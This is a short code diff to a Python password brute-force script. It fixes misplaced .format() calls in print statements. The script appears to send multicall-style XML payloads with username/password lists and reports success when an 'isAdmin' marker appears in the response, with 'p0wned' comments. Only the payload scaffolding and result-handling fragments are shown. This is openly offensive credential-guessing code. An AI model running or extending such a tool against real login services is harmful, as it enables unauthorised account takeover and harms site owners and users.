@@ -36,7 +36,6 @@ payload_start = """
                     <data>
 """
 
-
 payload_end = """
                     </data>
                 </array>
@@ -103,19 +102,19 @@ def send_request_with_username(username, passwords):
         print("[+] response HTTP 200 OK received, analysing results...")
         # p0wned. This is the end :P
         if b"isAdmin" in resp.content:
-            print("[+] SUCCESS !!! Matching username/password for {} found!, please review response content for details...").format(username)
+            print("[+] SUCCESS !!! Matching username/password for {} found!, please review response content for details...".format(username))
             output.write(resp.content)
             exit(0)
 
         else:
             print(
-                "[-] no matching username/password for {} found... :(").format(username)
+                "[-] no matching username/password for {} found... :(".format(username))
 
         output.write(resp.content)
 
     else:
-        print("[-] something wrong, {} HTTP Response form{} received: \n\n").format(
-            resp.status_code, username)
+        print("[-] something wrong, {} HTTP Response form{} received: \n\n".format(
+            resp.status_code, username))
         print(resp.content)
 
 
